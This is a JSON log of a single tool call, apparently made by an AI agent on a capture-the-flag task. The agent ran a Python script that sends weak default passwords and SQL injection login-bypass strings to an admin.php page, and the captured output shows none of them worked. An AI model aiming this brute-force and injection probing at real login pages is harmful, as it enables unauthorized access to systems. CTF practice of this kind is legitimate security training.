@@ -1,0 +1,39 @@
+{
+  "arguments": {
+    "code": "\nimport urllib.request, urllib.parse, urllib.error\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef login(user, pwd):\n    data = urllib.parse.urlencode({\"username\": user, \"password\": pwd, \"submit\": \"login\"}).encode()\n    try:\n        with op.open(BASE + \"admin.php\", data=data, timeout=20) as r:\n            b = r.read().decode(\"utf-8\", \"replace\")\n            return r.status, b, dict(r.headers)\n    except urllib.error.HTTPError as e:\n        return e.code, e.read().decode(\"utf-8\", \"replace\"), dict(e.headers)\n    except Exception as e:\n        return \"ERR\", \"%s: %s\" % (type(e).__name__, e), {}\n\nbase = login(\"x\", \"y\")[1]\nprint(\"基线响应长度:\", len(base))\n\ncases = [\n    (\"admin\", \"admin\"),\n    (\"admin\", \"123456\"),\n    (\"admin\", \"admin123\"),\n    (\"admin\", \"password\"),\n    (\"root\", \"root\"),\n    (\"administrator\", \"admin\"),\n    (\"admin' or '1'='1\", \"x\"),\n    (\"admin' -- \", \"x\"),\n    (\"admin'#\", \"x\"),\n    (\"' or 1=1#\", \"x\"),\n    (\"admin' or 1=1 limit 1#\", \"x\"),\n    (\"' or '1'='1' #\", \"x\"),\n]\nfor u, p in cases:\n    st, b, hd = login(u, p)\n    diff = \"\" if len(b) == len(base) else \"  <<< 长度变化\"\n    print(\"%-24s / %-10s -> %s len=%s%s\" % (u, p, st, len(b), diff))\n    if len(b) != len(base):\n        print(\"    body:\", b[:300].replace(\"\\n\", \" \"))\n    sc = hd.get(\"Set-Cookie\")\n    if sc:\n        print(\"    set-cookie:\", sc)\n",
+    "timeout": 120,
+    "wp_purpose": "对 admin.php 做弱口令与 SQL 注入登录探测",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "response": {
+    "ok": true,
+    "result": {
+      "exit": 0,
+      "stdout": "基线响应长度: 289\nadmin                    / admin      -> 200 len=289\nadmin                    / 123456     -> 200 len=289\nadmin                    / admin123   -> 200 len=289\nadmin                    / password   -> 200 len=289\nroot                     / root       -> 200 len=289\nadministrator            / admin      -> 200 len=289\nadmin' or '1'='1         / x          -> 200 len=289\nadmin' --                / x          -> 200 len=289\nadmin'#                  / x          -> 200 len=289\n' or 1=1#                / x          -> 200 len=289\nadmin' or 1=1 limit 1#   / x          -> 200 len=289\n' or '1'='1' #           / x          -> 200 len=289\n",
+      "stderr": "",
+      "output_truncated": false
+    },
+    "tool": "py_run",
+    "dangerous": false,
+    "wp_operation": {
+      "operation_id": "bf21f1a9a2894cb5b5dc2f4f47e8498f",
+      "step": 19
+    },
+    "duration_ms": 1390.2,
+    "task_health": {
+      "ok": true,
+      "case": "ctf-fca56ff3a53c802b",
+      "calls": 9,
+      "failed_calls": 3,
+      "active_tool_seconds": 30.559,
+      "recent_failure_streak": 0,
+      "warnings": [],
+      "policy": "advisory_only",
+      "execution_blocked": false,
+      "model_tokens": null,
+      "model_cost": null,
+      "scope": "仅统计经过本系统的新调用；不含模型推理时间或费用，不证明答案正确。"
+    },
+    "evidence_path": "[CTF_ROOT]\\logs\\calls\\1792251541875191500-d4efe2e1.json"
+  }
+}
